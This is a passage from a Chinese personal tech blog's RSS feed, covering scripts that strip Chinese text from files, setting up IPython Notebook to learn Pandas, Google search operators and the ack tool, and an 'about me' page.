        &lt;span class="nx"&gt;output_filename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;filename_split&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;_output.&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;filename_split&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;reg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sr"&gt;/[\u4e00-\u9fa5].*/g&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
            &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;reg&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="nx"&gt;fs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;writeFile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;output_filename&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="p"&gt;);});&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;});&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;filetype&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;filenames&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;fs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;readdirSync&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;path&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;//等待io的返回，需要使用同步方法&lt;/span&gt;
&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;filter_filenames&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;filenames&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;is_filetype&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="nx"&gt;filter_filenames&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;clean_zh&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;使用：&lt;code&gt;node clean_zh.js PATH txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;js注意回调。回调之外想要控制顺序的话，用同步函数吧&lt;/p&gt;
&lt;h3&gt;Coffeescript&lt;/h3&gt;
&lt;p&gt;waiting&lt;/p&gt;
&lt;h3&gt;Bash&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="c1"&gt;#cd /tmp  使之成为当前工作目录&lt;/span&gt;

&lt;span class="nv"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$1&lt;/span&gt; &lt;span class="c1"&gt;#不能有空格 &lt;/span&gt;
&lt;span class="nv"&gt;filetype&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$2&lt;/span&gt;
&lt;span class="nb"&gt;cd&lt;/span&gt; &lt;span class="nv"&gt;$path&lt;/span&gt;
&lt;span class="nv"&gt;filenames&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;ls&lt;span class="sb"&gt;`&lt;/span&gt;
&lt;span class="c1"&gt;#echo $filenames&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; filename in &lt;span class="nv"&gt;$filenames&lt;/span&gt;
&lt;span class="k"&gt;do&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[[&lt;/span&gt; &lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$filename&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;~ .*txt &lt;span class="o"&gt;]]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="k"&gt;then&lt;/span&gt; &lt;span class="c1"&gt;#注意空格&lt;/span&gt;
        &lt;span class="c1"&gt;#如何把$filename变为字符串&lt;/span&gt;
        &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;import re;zh_to_endline = re.compile(r\&amp;quot;[\u4e00-\u9fa5].*\&amp;quot;);file = open(\&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$filename&lt;/span&gt;&lt;span class="s2"&gt;\&amp;quot;);clean_content = zh_to_endline.sub(\&amp;quot;\&amp;quot;,file.read());print(clean_content);&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; python3 &amp;gt;&amp;gt; &lt;span class="s2"&gt;&amp;quot;output_&lt;/span&gt;&lt;span class="nv"&gt;$filename&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
        &lt;span class="c1"&gt;#echo $filename&lt;/span&gt;
    &lt;span class="k"&gt;fi&lt;/span&gt;

&lt;span class="k"&gt;done&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;使用&lt;code&gt;sh clean_zh PATH txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;原先想用sed的，发现它好像根本不支持unicode？？耍赖把文本处理的工作丢给Python了。&lt;/p&gt;
&lt;p&gt;bash真是dirty and quick&lt;/p&gt;
&lt;h3&gt;Scheme&lt;/h3&gt;
&lt;h3&gt;Haskell&lt;/h3&gt;
&lt;h3&gt;Prolog&lt;/h3&gt;
&lt;h3&gt;Lua&lt;/h3&gt;
&lt;h3&gt;Clojure&lt;/h3&gt;
&lt;h3&gt;Scala&lt;/h3&gt;
&lt;h3&gt;Perl&lt;/h3&gt;
&lt;h3&gt;Racket&lt;/h3&gt;
&lt;h3&gt;C&lt;code&gt;#&lt;/code&gt;&lt;/h3&gt;
&lt;h3&gt;C&lt;/h3&gt;
&lt;h3&gt;Java&lt;/h3&gt;
&lt;h3&gt;PHP&lt;/h3&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 20 May 2015 00:00:00 +0000</pubDate><guid>tag:,2015-05-20:regex-demo.html</guid><category>regex</category></item><item><title>使用IPython Notebook来学习编程</title><link>/use-ipython-notebook.html</link><description>&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如果遇到了生活中不顺利的事情，你也只是需要一个新技巧了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我记下学习和做过的每件事。所以我很轻松可以回忆起自己的各种心理状态&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;只有你确定了你的目的，你才会应用你所学到的内容去实现你的目的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果你知道以上三句话出自哪里，你会鄙视我三天的&lt;/p&gt;
&lt;p&gt;所以我当然不会说出它们的出处，可偏偏你又会去搜索，我偏偏又喜欢到不得不引用它们orz  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;近来不少小伙伴有兴趣学编程，时常会被要求给些建议什么的。&lt;/p&gt;
&lt;p&gt;从自己的经历说起~&lt;br /&gt;
大四去西安玩，途中快读完《Python for Data Analysis》,兴致盎然，不能入睡。书的作者也是Pandas的作者（Pandas是基于Python的结构化数据分析利器）。书中案例的操作性极强，精彩纷呈。当时在车上觉得大致掌握了Pandas。&lt;br /&gt;
而后从事的工作与数据分析关系不大。长时间没有接触它，等前段时间再想用它来从log(json格式)中做些分析/统计，却连如何将json数据加载到DataFrame都给忘了orz&lt;/p&gt;
&lt;p&gt;不知你是否也有过此类尴尬，以至心有戚戚。对于那些不是日常使用的工具，如何保证学完后，能随时取用当时学会的知识，而不是遗忘之后，每次都从头再学一遍。&lt;/p&gt;
&lt;p&gt;当时学会是远远不够的，我们更关心的是需要时拿得出来用。用兵一时&lt;/p&gt;
&lt;p&gt;我的学习偏偏又习惯由兴趣驱动，等到想用的时候，兴趣不在这里，让我硬着头皮去再学一遍，恐怕效率是不高的。&lt;/p&gt;
&lt;p&gt;于是我琢磨能否尽可能地留存学会的东西，或者复习时能快速进入掌握时的状态，我能想到的，且实践过行之有效的一些方法如下：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在书籍上批注，这样其实相当于给记忆打快照，日后再翻有助于勾起记忆&lt;/li&gt;
&lt;li&gt;一边学习，一遍在印象笔记做笔记&lt;/li&gt;
&lt;li&gt;学会某些知识后，即时梳理，整理为博客，给身边的小伙伴布道，将学会的东西表达出来，加深理解的同时，也方便自己此后穿梭回这个状态点。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;以上几点便是我学习新东西时，习惯采用的方法，知识的留存率的确比采用它们之前提高不少，可也不尽如人意:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;第一点实施起来并不方便，首先你得买纸质书，抛开价格贵，难搬家，易遗失不说，不少资料是根本没有纸质版的。我见过最好的替代方案是将素材拍到Noteself中，而后在其中做笔记，这是最近从一个小伙伴那儿学来的，笔记全部交给Noteself，从不丢失，随时可用，她的技能树极其茂盛，我想Noteself是很重要的原因，所谓善假于物。&lt;/li&gt;
&lt;li&gt;我大约是那种离开印象笔记就生活无法自理的人。但即便如此，它也有不令人满意的地方，首先没法用markdown，这样一来做技术相关的笔记是很不方便的（弥补方法是使用web版本的印象笔记，而后用chrome的markdown here插件转化markdown）。另外学习中做的笔记往往是很碎片的，如果不定期整理/合并很难以复用，可能比资料本身还乱。&lt;/li&gt;
&lt;li&gt;写博客是我现在最喜欢的一种学习方式，如果你还没开始，或不够坚定，建议看看刘未鹏的&lt;a href="http://mindhacks.cn/2009/02/15/why-you-should-start-blogging-now/"&gt;为什么你应该（从现在开始就）写博客&lt;/a&gt;，缺点的话，大约是它不适合容纳细碎的知识。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;回到我们的编程话题。以上几点适用于大多数的学习，针对Python编程，我最近找到更好的方法，用了几天，觉得效率简直飞起。分享过来。&lt;/p&gt;
&lt;p&gt;杀器就是&lt;code&gt;IPython Notebook&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;ipython就已经够神器了，Tab键补全、魔术方法、与一堆科学计算库的搭配，以及强大的调试功能。&lt;/p&gt;
&lt;p&gt;我此前有写过一篇&lt;a href="http://wwj718.github.io/learning-ipython.html"&gt;ipython使用笔记&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;IPython Notebook是一种基于Web技术的交互式计算文档格式，同时也是计算工具（界面）&lt;/p&gt;
&lt;p&gt;notebook的页面都被保存为.ipynb 的类JSON文件格式。这也是 Notebook 最吸引人的地方，其中可以写python代码，可以写markdown文档，可以呈现图表...&lt;/p&gt;
&lt;p&gt;你还可以将写好的.ipynb上传到github，分发给小伙伴，拿到.ipynb的小伙伴在IPython Notebook中加载执行它，对你的工作便一目了然，你们近乎共享了编程的过程。你在.ipynb中加上批注和说明之后分发出去，它就成为绝佳的教学和交流的载体！&lt;/p&gt;
&lt;p&gt;此外我最近在用它学习Pandas，以便做edX tracking logs的数据分析工作，简直酸爽&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/pydata/pydata-book"&gt;pydata-book&lt;/a&gt;是《Python for Data Analysis》一书中相应的示例源码。这本书我翻过，所以直接将其源码加载到ipyhton notebook里开撸，偶有不懂，通过交互式探索或是查阅书籍，很快就回忆起来了，而我又可以随时在其中注释批注，用markdown写心得或疑问，而所有这些，都连同可执行的代码保存在.ipynb里，&lt;/p&gt;
&lt;p&gt;如果中途我遇到问题，我完全可以将代码连同批注和疑惑发给别人（仅是.ipynb这个文件），对方完全看得到我的思维过程。他也在.ipynb中解答，之后回传给我即可，多便捷的交流过程啊！&lt;/p&gt;
&lt;h2&gt;我的Pandas学习环境&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cd ~
mkdir pydata
cd pydata
git clone https://github.com/pydata/pydata-book
virtualenv pandas_env
source pandas_env/bin/activate
pip install ipython pyzmq jinja2 tornado jsonschema pylab
vim ~/.zshrc
#我用的是zsh，你用bash的话，对应的是 .bashrc
alias pandas=&amp;#39;cd ~/pydata/pydata-book&amp;amp;&amp;amp;source ~/pydata/pandas_env/bin/activate&amp;amp;&amp;amp;ipython notebook&amp;#39;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;退出重新进入shell，输入pandas，就进入学习环境了&lt;/p&gt;
&lt;p&gt;这样一来，我每次想学习的时候，直接在终端输入pandas就可以开始了！循着上次的注释和笔记，很快就可以进入学习状态&lt;/p&gt;
&lt;p&gt;&lt;img alt="pandas_shell" src="img/jishu/pandas_shell.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="pandas_web1" src="img/jishu/pandas_web1.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="pandas_web2" src="img/jishu/pandas_web2.jpeg" /&gt;&lt;/p&gt;
&lt;h1&gt;后记&lt;/h1&gt;
&lt;p&gt;安装错误:&lt;code&gt;No module named zmq.eventloop&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;解决方案: &lt;code&gt;sudo pip install pyzmq --upgrade&lt;/code&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 20 May 2015 00:00:00 +0000</pubDate><guid>tag:,2015-05-20:use-ipython-notebook.html</guid><category>python</category></item><item><title>搜索技巧小结</title><link>/search-skill.html</link><description>&lt;h1&gt;网络搜索&lt;/h1&gt;
&lt;h2&gt;google&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;谷歌给你你想要的，百度给你它想给你的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;First of all , please use Google &lt;/p&gt;
&lt;p&gt;无论对于技术人员搜索问题解决方案，或是科研人员进行学术搜索，又或是黑客们搜集目标资料，谷歌都是极好的选择。也许是这个星球上最好的选择:)&lt;/p&gt;
&lt;p&gt;下边小结下可能时常用到的一些技巧&lt;/p&gt;
&lt;h3&gt;与或非逻辑&lt;/h3&gt;
&lt;h4&gt;与&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;+&lt;/code&gt;或&lt;code&gt;空格&lt;/code&gt;表示&lt;code&gt;与&lt;/code&gt;逻辑&lt;/p&gt;
&lt;h5&gt;示例&lt;/h5&gt;
&lt;p&gt;搜索所有包含&lt;code&gt;编程&lt;/code&gt;和&lt;code&gt;入门&lt;/code&gt;的网页&lt;br /&gt;
搜索：&lt;code&gt;编程 + 入门&lt;/code&gt; 或者 &lt;code&gt;编程 入门&lt;/code&gt;&lt;/p&gt;
&lt;h5&gt;另外&lt;/h5&gt;
&lt;p&gt;你如果要求&lt;code&gt;编程入门&lt;/code&gt;需要作为一个短语出现，那么需要这样搜索&lt;code&gt;"编程入门"&lt;/code&gt;，给短语加上双引号&lt;/p&gt;
&lt;h4&gt;或&lt;/h4&gt;
&lt;p&gt;用大写的&lt;code&gt;OR&lt;/code&gt;表示&lt;code&gt;或&lt;/code&gt;逻辑&lt;/p&gt;
&lt;h5&gt;示例&lt;/h5&gt;
&lt;p&gt;搜索所有包含&lt;code&gt;编程&lt;/code&gt;或&lt;code&gt;入门&lt;/code&gt;的网页&lt;br /&gt;
搜索：&lt;code&gt;编程 OR 入门&lt;/code&gt;&lt;/p&gt;
&lt;h4&gt;非&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;-&lt;/code&gt;表示&lt;code&gt;非&lt;/code&gt;逻辑&lt;/p&gt;
&lt;h5&gt;示例&lt;/h5&gt;
&lt;p&gt;搜索所有包含&lt;code&gt;编程&lt;/code&gt;而不含&lt;code&gt;入门&lt;/code&gt;的网页&lt;br /&gt;
搜索：&lt;code&gt;编程 - 入门&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;通配符、大小写、忽略字符&lt;/h3&gt;
&lt;p&gt;GOOGLE不支持通配符，如&lt;code&gt;*&lt;/code&gt;、&lt;code&gt;?&lt;/code&gt;等，只能做精确查询&lt;br /&gt;
GOOGLE对大小写不敏感&lt;br /&gt;
英文符号（如问号，句号，逗号等）无法成为搜索关键字&lt;/p&gt;
&lt;h3&gt;site，link，inurl，allinurl，intitle，allintitle&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;site:URL&lt;/code&gt;:表示搜索结果局限于某个具体网站&lt;/li&gt;
&lt;li&gt;&lt;code&gt;link:URL&lt;/code&gt;:返回所有链接到某个URL地址的网页,&lt;code&gt;link&lt;/code&gt;不能与其他语法相混合操作&lt;/li&gt;
&lt;li&gt;&lt;code&gt;inurl:word1 word2&lt;/code&gt;:返回的网页链接中包含第一个关键字word1，后面的关键字word2则出现在链接中或者网页文档中&lt;/li&gt;
&lt;li&gt;&lt;code&gt;allinurl:word1 word2&lt;/code&gt;:语法返回的网页的链接中包含所有查询关键字。这个查询的对象只集中于网页的链接字符串&lt;/li&gt;
&lt;li&gt;&lt;code&gt;allintitle&lt;/code&gt;和&lt;code&gt;intitle&lt;/code&gt;的用法类似于上面的allinurl和inurl，只是后者对URL进行查询，而前者对网页的标题栏进行查询.即html里title之间的内容&lt;/li&gt;
&lt;li&gt;&lt;code&gt;related:URL&lt;/code&gt;:用来搜索结构内容方面相似的网页&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cache:URL&lt;/code&gt;:用来搜索GOOGLE服务器上某页面的缓存，这个功能同“网页快照”，通常用于查找某些已经被删除的死链接网页&lt;/li&gt;
&lt;li&gt;&lt;code&gt;info&lt;/code&gt;用来显示与某链接相关的一系列搜索&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;指定文件类型&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;filetype&lt;/code&gt;
举例：&lt;code&gt;filetype:pdf&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;PDF文档搜索&lt;/h3&gt;
&lt;p&gt;Google提供对PDF文档内文的检索&lt;br /&gt;
示例：搜索关于电子商务（ECOMMERCE）的PDF文档。&lt;br /&gt;
搜索：&lt;code&gt;inurl:pdf ecommerce&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;github&lt;/h2&gt;
&lt;p&gt;todo...&lt;/p&gt;
&lt;h1&gt;本地搜索&lt;/h1&gt;
&lt;h2&gt;ack&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;ack is the better grep&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ack是为程序员量身定制的grep，号称"可以替代99%grep的工作",以更简洁清晰的命令&lt;/p&gt;
&lt;h3&gt;卖点&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;速度快,因其只搜索有意义的东西。不会去搜索诸如.git和缓存之类的东西&lt;/li&gt;
&lt;li&gt;为源代码搜索而设计，更少的击键。write less do more&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;安装&lt;/h3&gt;
&lt;h4&gt;ubuntu&lt;/h4&gt;
&lt;p&gt;sudo apt-get install ack-grep&lt;/p&gt;
&lt;h4&gt;OS X&lt;/h4&gt;
&lt;p&gt;brew install ack&lt;/p&gt;
&lt;h3&gt;常用特性&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;代码搜索&lt;ul&gt;
&lt;li&gt;在指定类型文件中查找   &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;文件查找&lt;/li&gt;
&lt;li&gt;支持正则&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;代码搜索&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;ack-grep hello&lt;/code&gt; //默认是递归搜索(从当前目录开始)&lt;/p&gt;
&lt;h5&gt;在指定类型文件中查找&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;ack-grep --python django&lt;/code&gt; #查找所有python文件中出现的django&lt;/p&gt;
&lt;p&gt;ack预定义了很多类型，可以用 --help-types 来查看，如果没有你想要的，也可以自定义。好比你的css是用Sass写的，只要在~/.ackrc 里增加一行：
&lt;code&gt;--type-add css=.scss&lt;/code&gt;&lt;/p&gt;
&lt;h4&gt;文件查找&lt;/h4&gt;
&lt;p&gt;ack也可查找文件，免去结合find和grep的麻烦&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ack-grep -f hello.py    # 查找全匹配的文件
ack-grep -g hello.py$    # 查找正则匹配的文件
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;一些常用的参数&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;-n&lt;/code&gt; 不递归查找子目录 . &lt;code&gt;ack-grep -n note&lt;/code&gt; 只在当前目录下的文件里查找&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;-i&lt;/code&gt; 忽略大小写. &lt;code&gt;ack-grep -i note&lt;/code&gt; 也会匹配 Note&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;-f&lt;/code&gt; 查找文件 . &lt;code&gt;ack-grep -f --css&lt;/code&gt; 列出所有的css文件。--x 等价于 --type=x&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;-g&lt;/code&gt; 匹配文件名. &lt;code&gt;ack-grep -g note&lt;/code&gt; 会匹配所有文件名里包含note的文件 . &lt;code&gt;ack-grep -g hello.py$&lt;/code&gt;  查找正则匹配文件， 路径名也作为文件名的一部分！！&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;-C&lt;/code&gt; [NUM] 输出上下文 . &lt;code&gt;ack-grep -C 5 note&lt;/code&gt; 会在上下各多输出5行&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;-Q&lt;/code&gt; 不转义 . &lt;code&gt;ack-grep -Q 'note.url()'&lt;/code&gt; 不需要对点和括号进行转义了&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;与Vim搭配&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://github.com/mileszs/ack.vim"&gt;ack.vim&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.google.com/intl/zh-CN/search/about/insidesearch/tipstricks/basics.html"&gt;搜索技巧–搜索前沿–Google&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.sciencenet.cn/blog-734884-667157.html"&gt;如何使用GOOGLE高级搜索技巧&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 19 May 2015 00:00:00 +0000</pubDate><guid>tag:,2015-05-19:search-skill.html</guid><category>web</category></item><item><title>aboutme</title><link>/aboutme.html</link><description>&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;世界观上的不可知论者，方法论上的怀疑论者&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;折服于智者的思想，天才的灵感和黑客的一剑光寒&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;对我产生过深刻影响的人物： 帕斯卡尔 休谟 叔本华  罗素  维特根斯坦 波普尔 / 道金斯 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;影响着我的几个思考框架 ：进化论，概率论，博弈论&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;认为游戏是现实很好的隐喻&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;信奉技术的力量，开源拥趸，Linux/Python/Vim重度用户，装X的时候会用Scheme/Haskell写hello world，中立于面向对象和函数式阵营。工具论上的实用主义者&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;爱周末流浪，对美景有瘾，喜欢有趣的人&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;闲暇时间，睡懒觉，骑单车，读小说，秀厨艺，偶尔也学些甜言蜜语&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;勤劳勇敢热情善良（求不拆穿啊摔orz）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;试图学习却无法入门的三样东西：画画，乐理，PS&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;近期：布鲁斯口琴入门中，像喜欢上代码一样喜欢上经济学,开始关注 分析哲学&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;深爱过的一些书籍：《思想录》《自私的基因》《自私的皮球》《暗时间》《把时间当做朋友》《浮生六记》《茶花女》《红楼梦》《三体》《挪威的森林》《小王子》《月亮和六便士》《别闹了，费曼先生》《送你一颗子弹》《宋词三百首全解》《浪潮之巅》《代码大全》《Linux/Unix设计思想 》《Head first programming》《通灵芯片》《大教堂与集市》《精通正则表达式》《黑客与画家》《计算机程序的构造和解释》&lt;/p&gt;
&lt;/blockquote&gt;
